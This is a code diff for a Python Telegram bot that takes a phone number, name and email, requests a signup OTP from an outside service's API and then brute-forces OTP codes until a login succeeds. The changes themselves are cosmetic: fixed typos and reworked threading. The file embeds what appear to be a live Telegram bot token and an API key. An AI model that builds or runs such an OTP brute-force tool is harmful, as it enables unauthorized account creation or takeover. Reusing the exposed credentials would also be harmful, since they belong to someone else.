@@ -2,24 +2,25 @@ import requests
 import asyncio
 import random
 import logging
+import threading
 from flask import Flask
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-# Flask app for Koyeb health check
+# Flask server for Koyeb
 flask_app = Flask(__name__)
 
 @flask_app.route('/')
 def home():
-    return "Bot is running!"
+    return "Bot is running successfully!"
 
-# Logging setup
+# Setup logging
 logging.basicConfig(level=logging.INFO)
 
 # Telegram Bot Token
 TOKEN = "7810054325:AAFNvA74woOJL95yU7ZeBHIzI7SatP6d3HE"
 
-# Headers for API requests
+# API Headers
 HEADERS = {
     "Accept": "application/json, text/plain, */*",
     "x-api-key": "xeJJzhaj1mQ-ksTB_nF_iH0z5YdG50yQtwQCzbcHuKA",
@@ -39,7 +40,7 @@ ASK_ME_LINKS = [
 async def op(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("Send details in `{number} - {Name} - {email}` format.")
 
-# Handling user input for login
+# Handling user input
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_input = update.message.text.strip()
     try:
@@ -62,7 +63,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     otp_response = requests.post(otp_url, json=otp_data, headers=HEADERS)
     if otp_response.status_code == 200 and otp_response.json().get("result"):
-        await msg.edit_text("Signup Successfull - 👍")
+        await msg.edit_text("Signup Successful - 👍")
     else:
         await msg.edit_text("❌ OTP Sending Failed.")
         return
@@ -114,7 +115,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await msg.edit_text(f"Otp - Checked {checked_otps} OTPs")
 
     if found_otp:
-        await msg.edit_text("Login Successfull - 👍")
+        await msg.edit_text("Login Successful - 👍")
     else:
         await msg.edit_text("❌ OTP brute-force failed.")
 
@@ -134,21 +135,23 @@ async def run_telegram_bot():
 
     await app.initialize()
     await app.start()
-    await app.run_polling()
-    await app.stop()
+
+    print("Bot started successfully!")
+
+    try:
+        await app.run_polling()
+    except Exception as e:
+        logging.error(f"Bot error: {e}")
+    finally:
+        await app.stop()
 
 # Start Flask server and Telegram bot
 def start_services():
-    loop = asyncio.get_event_loop()
+    # Start Flask server in a separate thread
+    threading.Thread(target=lambda: flask_app.run(host="0.0.0.0", port=5000, debug=False), daemon=True).start()
 
-    # Run Flask server
-    from threading import Thread
-    flask_thread = Thread(target=lambda: flask_app.run(host="0.0.0.0", port=5000, debug=False))
-    flask_thread.start()
-
-    # Run Telegram bot in asyncio loop
-    loop.create_task(run_telegram_bot())
-    loop.run_forever()
+    # Start Telegram bot in the main thread
+    asyncio.run(run_telegram_bot())
 
 if __name__ == "__main__":
     start_services()
